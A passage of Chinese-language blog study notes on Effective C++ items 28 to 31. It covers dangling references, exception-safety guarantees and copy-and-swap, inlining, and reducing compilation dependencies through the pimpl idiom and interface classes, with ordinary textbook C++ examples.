class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种方法还是有问题的，若使用该引用时对象已经被销毁，会导致<code>悬垂引用（dangling references）</code>，产生未定义行为。<code>悬垂引用（dangling references）</code>指的是引用了已经被释放或无效的对象或变量的情况。还有<code>悬垂指针</code>指指向已经被释放或无效的内存地址的指针。</p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>避免<code>返回handles （包括references 、指针、迭代器）</code>指向对象内部。遵守这个条款可增加封装性，const 成员函数的行为像个const。</li></ul><h3 id="29-Strive-for-exception-safe-code"><a href="#29-Strive-for-exception-safe-code" class="headerlink" title="29.Strive for exception-safe code."></a>29.Strive for exception-safe code.</h3><h4 id="异常安全的三种承诺"><a href="#异常安全的三种承诺" class="headerlink" title="异常安全的三种承诺"></a>异常安全的三种承诺</h4><ul><li><strong>基本异常安全性（Basic Exception Safety）</strong>：<ul><li>承诺：不会泄露资源，对象保持一致性。</li><li>简要描述：在发生异常时，对象的内部状态仍然保持一致，没有资源泄漏，但可能会存在部分修改未被回滚。</li></ul></li><li><strong>强异常安全性（Strong Exception Safety）</strong>：<ul><li>承诺：在发生异常时，程序状态不会改变，资源不会泄漏。</li><li>简要描述：无论异常发生与否，程序状态都会保持不变，对象的内部状态完全一致，没有资源泄漏。</li></ul></li><li><strong>无异常安全性（No-Throw or No-Except Safety）</strong>：<ul><li>承诺：永远不会抛出异常。</li><li>简要描述：在函数执行过程中不会抛出异常，即使是在异常发生的情况下也能够正常执行。这通常需要通过使用 <code>noexcept</code> 关键字来声明函数不会抛出异常。</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyMenu</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">changeBackground</span><span class="params">(std::istream&amp; imgSrc)</span></span>;           <span class="comment">// change background</span></span><br><span class="line">  ...                                                    <span class="comment">// image</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">  Mutex mutex;                    <span class="comment">// mutex for this object</span></span><br><span class="line"></span><br><span class="line">  Image *bgImage;                 <span class="comment">// current background image</span></span><br><span class="line">  <span class="type">int</span> imageChanges;               <span class="comment">// # of times image has been changed</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现一</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrettyMenu::changeBackground</span><span class="params">(std::istream&amp; imgSrc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">lock</span>(&amp;mutex);                      <span class="comment">// acquire mutex (as in Item 14)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> bgImage;                    <span class="comment">// get rid of old background</span></span><br><span class="line">  ++imageChanges;                    <span class="comment">// update image change count</span></span><br><span class="line">  bgImage = <span class="keyword">new</span> <span class="built_in">Image</span>(imgSrc);       <span class="comment">// install new background</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">unlock</span>(&amp;mutex);                    <span class="comment">// release mutex</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当异常被抛出时，带有异常安全性的函数会：</p><ul><li>不泄漏任何资源。上述代码没有做到这一点，因为一旦”new Image (imgSrc)” 导致异常，对unlock 的调用就绝不会执行，于是互斥器就永远被把持住了。</li><li>不允许数据败坏。如果”new Image (imgSrc)” 抛出异常，gimage 就是指向一个已被删除的对象， imageChanges 也已被累加，而其实并没有新的图像被成功安装起来。</li></ul><p>由智能指针管理图像和锁，在reset成员函数旧图像被替换引用归零对象被删除，在作用域结束时，锁自动被释放。保证基本异常安全性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyMenu</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  std::shared_ptr&lt;Image&gt; bgImage;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrettyMenu::changeBackground</span><span class="params">(std::istream&amp; imgSrc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function">Lock <span class="title">ml</span><span class="params">(&amp;mutex)</span></span>;</span><br><span class="line"></span><br><span class="line">  bgImage.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">Image</span>(imgSrc));  <span class="comment">// replace bgImage&#x27;s internal</span></span><br><span class="line">                                     <span class="comment">// pointer with the result of the</span></span><br><span class="line">                                     <span class="comment">// &quot;new Image&quot; expression</span></span><br><span class="line">  ++imageChanges;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="copy-and-swap"><a href="#copy-and-swap" class="headerlink" title="copy and swap"></a>copy and swap</h4><p>通过pimpl idiom实现。实现了强异常安全性。</p><p><code>copy-and-swap</code> 的关键在千“修改对象数据的副本，然后在一个<code>不抛异常的函数</code>中将修改后的数据和原件置换”，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PMImpl</span> &#123;                               <span class="comment">//因为pretty的封装性使由pImpl是private得到了保证</span></span><br><span class="line">  std::shared_ptr&lt;Image&gt; bgImage;        </span><br><span class="line">  <span class="type">int</span> imageChanges;                          </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PrettyMenu</span> &#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  Mutex mutex;</span><br><span class="line">  std::tr1::shared_ptr&lt;PMImpl&gt; pImpl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrettyMenu::changeBackground</span><span class="params">(std::istream&amp; imgSrc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">using</span> std::swap;                            <span class="comment">// see Item 25</span></span><br><span class="line"></span><br><span class="line">  <span class="function">Lock <span class="title">ml</span><span class="params">(&amp;mutex)</span></span>;                            <span class="comment">// acquire the mutex</span></span><br><span class="line"></span><br><span class="line">  std::shared_ptr&lt;PMImpl&gt;                <span class="comment">// copy obj. data</span></span><br><span class="line">    <span class="built_in">pNew</span>(<span class="keyword">new</span> <span class="built_in">PMImpl</span>(*pImpl));</span><br><span class="line"></span><br><span class="line">  pNew-&gt;bgImage.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">Image</span>(imgSrc));     <span class="comment">// modify the copy</span></span><br><span class="line">  ++pNew-&gt;imageChanges;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">swap</span>(pImpl, pNew);                          <span class="comment">// swap the new</span></span><br><span class="line">                                              <span class="comment">// data into place</span></span><br><span class="line"></span><br><span class="line">&#125;                                             <span class="comment">// release the mutex</span></span><br></pre></td></tr></table></figure><p>考虑如下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void someFunc()</span><br><span class="line">&#123;</span><br><span class="line">  ...                                     // make copy of local state</span><br><span class="line">  f1();</span><br><span class="line">  f2();</span><br><span class="line">  ...                                     // swap modified state into place</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>很明显，如果 f1 或 f2 低于强力异常安全，someFunc 就很难成为强力异常安全的。例如，假设 f1 仅提供基本保证。为了让 someFunc 提供强力保证，它必须写代码在调用 f1 之前测定整个程序的状态，并捕捉来自 f1 的所有异常，然后恢复到最初的状态。</p></li><li><p>即使 f1 和 f2 都是强力异常安全的，事情也好不到哪去。如果 f1 运行完成，程序的状态已经发生了毫无疑问的变化，所以如果随后 f2 抛出一个异常，即使 f2 没有改变任何东西，程序的状态也已经和调用 someFunc 时不同。</p></li><li><p>当“强烈保证”不切实际时，你就必须提供“基本保证”。现实中你或许会发现，你可以为某些函数提供强烈保证，但效率和复杂度带来的成本会使它对许多人而言摇摇欲坠。</p></li><li><p>问题出在“连带影响”(side effects) ~如果函数只操作局部性状态(local state,例如someFunc 只影响其“调用者对象”的状态），便相对容易地提供强烈保证。但是当函数对“非局部性数据” (non-local data) 有连带影响时，提供强烈保证就困难得多。</p></li></ul><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><ul><li>异常安全函数(Exception-safe functions) 即使发生异常也不会泄漏资源或允许任何数据结构败坏。这样的函数区分为三种可能的保证：<code>基本型、强烈型、不抛异常型</code>。</li><li>“强烈保证”往往能够以copy-and-swap 实现出来，但“强烈保证”并非对所有函数都可实现或具备现实意义。</li><li>函数提供的“异常安全保证“通常最高只等于其所调用之各个函数的“异常安全保证”中的最弱者。</li></ul><h3 id="30-Understand-the-ins-and-outs-of-inlining"><a href="#30-Understand-the-ins-and-outs-of-inlining" class="headerlink" title="30. Understand the ins and outs of inlining."></a>30. Understand the ins and outs of inlining.</h3><ul><li>过度使用inline函数会膨胀你生成的二进制文件。</li><li>inline只是对编译器的一个申请，不是强制命令。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Person &#123;</span><br><span class="line">public:</span><br><span class="line">  ...</span><br><span class="line">  int age() const &#123; return theAge; &#125;    // an implicit inline request: age is</span><br><span class="line">  ...                                   // defined in a class definition</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  int theAge;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>这样的函数通常是成员函数，但是 Item 46 解释了友元函数也能被定义在类的内部，如果它们在那里，它们也被隐式地声明为 inline。</li></ul><p>例如，如果你的程序要持有一个 inline 函数的地址，编译器必须为它生成一个 outlined 函数本体。他们怎么能生成一个指向根本不存在的函数的指针呢？再加上，编译器一般不会对通过函数指针的调用进行 inline ，这就意味着，对一个 inline 函数的调用可能被也可能不被 inline 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">inline void f() &#123;...&#125;      // assume compilers are willing to inline calls to f</span><br><span class="line"></span><br><span class="line">void (*pf)() = f;          // pf points to f</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">f();                       // 将被inline</span><br><span class="line">pf();                      // 不被inline，因为它通过函数指针生成</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Inline 函数通常－定被置于头文件内，因为大多数建置环境(build environments)在编译过程中进行inlining, 而为了将一个“函数调用“替换为”被调用函数的本体”，编译器必须知道那个函数长什么样子。</li><li>Templates 通常也被置千头文件内，因为它一旦被使用，编译器为了将它具现化，需要知道它长什么样子。</li><li>大部分编译器拒绝将<code>太过复杂（例如带有循环或递归</code>）的函数inlining, 而所有对<code>virtual 函数</code>的调用（除非是最平淡无奇的）也都会使inlining 落空。</li><li>virtual 意味”等待，直到运行期才确定调用哪个函数”，而inline 意味“执行前，先将调用动作替换为被调用函数的本体”。</li><li>构造函数和析构函数不适合inline，因为inline后必须处理异常，膨胀生成的二进制文件。</li><li>inline函数难以随程序库的升级而升级。如果你改变了内联函数的实现，必须重新编译引用了该内联函数的所有代码，以便更新这些代码中的内联函数定义。</li></ul><h4 id="请记住-4"><a href="#请记住-4" class="headerlink" title="请记住"></a>请记住</h4><ul><li>将大多数inlining 限制在小型、被频繁调用的函数身上。这可使日后的调试过程和二进制升级(binary upgradability) 更容易，也可使潜在的代码膨胀问题最小化，使程序的速度提升机会最大化。</li><li>不要只因为function templates 出现在头文件，就将它们声明为inline 。</li></ul><h3 id="31-Minimize-compilation-dependencies-between-files"><a href="#31-Minimize-compilation-dependencies-between-files" class="headerlink" title="31. Minimize compilation dependencies between files."></a>31. Minimize compilation dependencies between files.</h3><p>请看一个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;date.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;address.h&quot;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Person</span>(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> Date&amp; birthday,</span><br><span class="line">         <span class="type">const</span> Address&amp; addr);</span><br><span class="line">  <span class="function">std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">  <span class="function">std::string <span class="title">birthDate</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">  <span class="function">std::string <span class="title">address</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">      std::string theName;        <span class="comment">// implementation detail</span></span><br><span class="line">      Date theBirthDate;          <span class="comment">// implementation detail</span></span><br><span class="line">      Address theAddress;         <span class="comment">// implementation detail</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>当我们在<code>#include时，</code>就在Person定义文件和其含入文件之间形成了一种<code>编译依存关系(compilation dependency)</code>,如果被包含文件发生任何改动，那么包含它的源文件也需要重新编译。在大型项目中，这是致命的。</li><li>我们可以通过<code>预编译头文件</code>来防止重复编译相同的头文件。</li><li><code>cpp编译器</code>在编译期间要知道它的对象的大小。</li></ul><p>我们可以使用<code>前向声明</code>，<code>前向声明</code>是在编译时解析的，它告诉编译器某个实体的存在，但不提供其具体的实现细节。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line">     <span class="keyword">class</span> <span class="title class_">string</span>;             <span class="comment">// forward declaration (an incorrect</span></span><br><span class="line">&#125;                              <span class="comment">// one — see below)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>;                    <span class="comment">// forward declaration</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Address</span>;                 <span class="comment">// forward declaration</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">      <span class="built_in">Person</span>(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> Date&amp; birthday,</span><br><span class="line">                 <span class="type">const</span> Address&amp; addr);</span><br><span class="line">      <span class="function">std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">      <span class="function">std::string <span class="title">birthDate</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">      <span class="function">std::string <span class="title">address</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="又是pimple-idiom"><a href="#又是pimple-idiom" class="headerlink" title="又是pimple idiom"></a>又是pimple idiom</h4><p>通过<code>pimple idiom</code>可以实现，<code>person</code>class只含有一个<code>PersonImpl</code>指针成员，指向其实现类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span>                      <span class="comment">// standard library components</span></span></span><br><span class="line">                                       <span class="comment">// shouldn&#x27;t be forward-declared</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PersonImpl</span>;                      <span class="comment">// forward decl of Person impl. class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>;                            <span class="comment">// forward decls of classes used in</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Address</span>;                         <span class="comment">// Person interface</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="built_in">Person</span>(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> Date&amp; birthday,</span><br><span class="line">        <span class="type">const</span> Address&amp; addr);</span><br><span class="line"> <span class="function">std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"> <span class="function">std::string <span class="title">birthDate</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"> <span class="function">std::string <span class="title">address</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:                                   <span class="comment">// ptr to implementation;</span></span><br><span class="line">  std::shared_ptr&lt;PersonImpl&gt; pImpl;  <span class="comment">// see Item 13 </span></span><br><span class="line">&#125;;                                         </span><br></pre></td></tr></table></figure><ul><li><p>Person 的客户就完全与Dates, Addresses 以及Persons 的实现细目分离了。那些classes 的任何实现修改都不需要Person 客户端重新编译。此外由于客户无法看到Person 的实现细目，也就不可能写出什么“取决于那些细目”的代码。这真正是“接口与实现分离”!</p></li><li><p>关键在于以<code>“声明的依存性＂</code>替换<code>“定义的依存性”</code>，那正是<code>编译依存性最小化</code>的本质：现实中让头文件尽可能自我满足，万一做不到，则计它与其他文件内的声明式（而非定义式）相依。</p></li></ul><p>像 <code>Person</code> 这样使用 Pimpl Idiom 的类通常被称为<code>Handle classes（句柄类）</code>。Handle 类封装了指向实现类（Implementation classes）的指针，并将所有函数调用转发给实现类来完成实际的工作。Handle 类的主要作用是提供公共接口，并隐藏了实现细节，使得用户只需与 Handle 类交互而无需了解其背后的具体实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Person.h&quot;</span>          <span class="comment">// 我们正在实现 Person 类，所以我们必须 #include 它的类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PersonImpl.h&quot;</span>      <span class="comment">// 我们还必须 #include PersonImpl 的类定义，否则我们无法调用其成员函数；注意，PersonImpl 与 Person 有完全相同的成员函数 — 它们的接口是相同的</span></span></span><br><span class="line"></span><br><span class="line">Person::<span class="built_in">Person</span>(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> Date&amp; birthday,</span><br><span class="line">               <span class="type">const</span> Address&amp; addr)</span><br><span class="line">: <span class="built_in">pImpl</span>(<span class="keyword">new</span> <span class="built_in">PersonImpl</span>(name, birthday, addr))</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">Person::name</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> pImpl-&gt;<span class="built_in">name</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在Handle classes 身上，成员函数必须通过implementation pointer 取得对象数据。那会为每一次访问增加一层间接性。而每一个对象消耗的内存数景必须增加implementation pointer 的大小。最后， implementation pointer 必须初始化（在Handleclass 构造函数内），指向一个动态分配得来的implementation object, 所以你将蒙受因动态内存分配（及其后的释放动作）而来的额外开销，以及遭遇bad—alloc 异常（内存不足）的可能性。</p><h4 id="interface-class"><a href="#interface-class" class="headerlink" title="interface class"></a>interface class</h4><p>令person称为特殊的abstract base class(抽象基类)</p><p>工厂函数或虚拟构造函数的概念，用于创建派生类对象并返回指向基类接口的指针。这样的设计模式允许客户端代码通过调用工厂函数来创建新对象，而无需直接使用派生类的构造函数。这种做法有助于实现<code>多态性和封装性</code>。</p><p>这种class 的目的是详细一一描述derived classes 的接口（见条款34) ，因此它通常不带成员变量，也没有构造函数，只有一个virtual 析构函数（见条款7) 以及一组pure virtual 函数，用来叙述整个接口。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">Person</span>();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::string <span class="title">birthDate</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::string <span class="title">address</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个class 的客户必须以<code>Person 的pointers 和references</code>来撰写应用程序，因为它不可能针对“内含pure virtual 函数”的Person classes 具现出实体。（然而却有可能对派生自Person 的classes 具现出实体）就像Handle classes 的客户一样，除非Interface class 的接口被修改否则其客户不需重新编译。</p><p>我们可以定义<code>工厂函数</code>或<code>virtual构造函数</code>返回<code>智能指针</code>指向动态分配所得对象来为这种class创建新对象。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> <span class="type">static</span> std::shared_ptr&lt;Person&gt;    <span class="comment">// 返回一个 shared_ptr，指向一个用给定参数初始化的新 Person；请参阅 Item 18，了解为什么返回一个 shared_ptr</span></span><br><span class="line">   <span class="built_in">create</span>(<span class="type">const</span> std::string&amp; name,      <span class="comment">// 给定姓名的 Person 初始化</span></span><br><span class="line">          <span class="type">const</span> Date&amp; birthday,         <span class="comment">// 给定生日的 Person 初始化</span></span><br><span class="line">          <span class="type">const</span> Address&amp; addr);         <span class="comment">// 给定地址的 Person 初始化</span></span><br><span class="line"> ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RealPerson</span>: <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">RealPerson</span>(<span class="type">const</span> std::string&amp; name, <span class="type">const</span> Date&amp; birthday,</span><br><span class="line">             <span class="type">const</span> Address&amp; addr)</span><br><span class="line">  : <span class="built_in">theName</span>(name), <span class="built_in">theBirthDate</span>(birthday), <span class="built_in">theAddress</span>(addr)</span><br><span class="line">  &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">RealPerson</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">std::string <span class="title">name</span><span class="params">()</span> <span class="type">const</span></span>;        <span class="comment">// implementations of these </span></span><br><span class="line">  <span class="function">std::string <span class="title">birthDate</span><span class="params">()</span> <span class="type">const</span></span>;   <span class="comment">// functions are not shown, but</span></span><br><span class="line">  <span class="function">std::string <span class="title">address</span><span class="params">()</span> <span class="type">const</span></span>;     <span class="comment">// they are easy to imagine</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::string theName;</span><br><span class="line">  Date theBirthDate;</span><br><span class="line">  Address theAddress;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">std::string name;</span><br><span class="line">Date dateOfBirth;</span><br><span class="line">Address address;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建支持 Person 接口的对象</span></span><br><span class="line"><span class="function">std::shared_ptr&lt;Person&gt; <span class="title">pp</span><span class="params">(Person::create(name, dateOfBirth, address))</span></span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; pp-&gt;<span class="built_in">name</span>()                 <span class="comment">// 通过 Person 接口使用对象</span></span><br><span class="line">          &lt;&lt; <span class="string">&quot; was born on &quot;</span>            <span class="comment">// Person 接口</span></span><br><span class="line">          &lt;&lt; pp-&gt;<span class="built_in">birthDate</span>()</span><br><span class="line">          &lt;&lt; <span class="string">&quot; and now lives at &quot;</span></span><br><span class="line">          &lt;&lt; pp-&gt;<span class="built_in">address</span>();</span><br><span class="line">...                                     <span class="comment">// 当 pp 超出范围时，对象会自动被删除 — 请参见 Item 13 注释</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对这个特定的 RealPerson，写 Person::create 确实没什么价值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 